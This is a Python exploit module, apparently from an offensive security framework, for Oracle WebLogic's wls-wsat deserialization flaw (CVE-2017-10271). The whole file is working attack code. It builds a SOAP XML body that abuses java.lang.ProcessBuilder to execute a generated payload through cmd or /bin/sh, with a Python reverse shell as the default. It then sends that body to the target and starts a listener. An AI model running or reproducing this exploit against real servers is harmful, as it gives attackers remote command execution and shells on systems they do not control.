#!/usr/bin/env python3
# Project: osiris-framework
# Author: Samir Sanchez Garnica @sasaga92
# Version 1.0
# Date: 14/11/2022

from core.ModuleObtainer import obtainer
from core.Processor import processor
from core.generator.Generator import generator
from utilities.Tools import tools
from xml.sax.saxutils import escape
from requests import post
from utilities.Messages import print_message

print_message.name_module = __file__

info = {
    'author': 'Samir Sanchez Garnica',
    'date': '04/04/2019',
    'rank': 'Excellent',
    'category': 'Exploit',
    'path': 'exploits/http/oracle/weblogic/weblogic_wsat_deserialization_rce.py',
    'license': 'GPL-2.0',
    'description': 'This module explode Oracle WebLogic wls-wsat Component Deserialization RCE',
    'references': ['https://www.cvedetails.com/cve/CVE-2017-10271/']
}
options = {
    'target': ['Yes', 'set target to attack', ''],
    'platform': ['Yes', 'set id target to attack', '1'],
    'payload': ['Yes', 'Set payload attack software', 'cmd/unix/reverse/python_3_2'],
    'targeturi': ['Yes', 'Sets the URI of the object to be exploited', '/wls-wsat/CoordinatorPortType']
}

extra_info = {
    'cve': ['CVE-2017-10271'],
    'targets': ['Microsoft Windows', 'GNU/Linux']
}

required = {
    'start_required': 'True',
    'check_required': 'False'
}


def RCE(__cmd_base, __cmd_opt, __payload):
    return f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3" >
                <void index="0">
                  <string>{__cmd_base}</string>
                </void>
                <void index="1">
                  <string>{__cmd_opt}</string>
                </void>
                <void index="2">
                  <string>{__payload}</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''


def exploit():
    try:
        print_message.start_execution()
        __rhost = tools.http_or_https(obtainer.options['target'][2])
        if __rhost['code'] == 200:
            try:
                __platform = int(obtainer.options['platform'][2])

                if extra_info['targets'][__platform]:
                    __platform = extra_info['targets'][__platform]

                __payload_generate = generator.generator_payload(options_payload=obtainer.options_payload, options_exploit=obtainer.options, extra_info=extra_info)

                if __payload_generate['code'] == 200:
                    __payload_generate = escape(__payload_generate['message'])

                    try:
                        processor.multi_handler(payload_options=obtainer.options_payload,
                                                exploit_options=obtainer.options)

                        __cmd_base = 'cmd' if 'windows' in __platform.lower() else '/bin/sh'
                        __cmd_opt = '/c' if 'windows' in __platform.lower() else '-c'

                        try:
                            __headers = {
                                "Content-Type":
                                    "text/xml;charset=UTF-8",
                                "User-Agent": (
                                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 "
                                        + "(KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
                                ),
                            }

                            __url = f"{obtainer.options['target'][2]}/{obtainer.options['targeturi'][2]}"
                            __payload = RCE(__cmd_base, __cmd_opt, __payload_generate)

                            _ = post(__url, data=__payload, headers=__headers, timeout=10, verify=False)
                            print_message.execution_info("payload sent successfully by {}".format(__url))
                        except Exception as Error:
                            print_message.execution_error(Error.args[0])

                    except Exception as Error:
                        print(Error)

            except ValueError:
                print_message.execution_error("The target ID must be numeric")
                return False
        else:
            print_message.execution_error("The URL must be in the format http:// or https://")
            return False
    except Exception as Error:
        print(Error)

    print_message.end_execution()
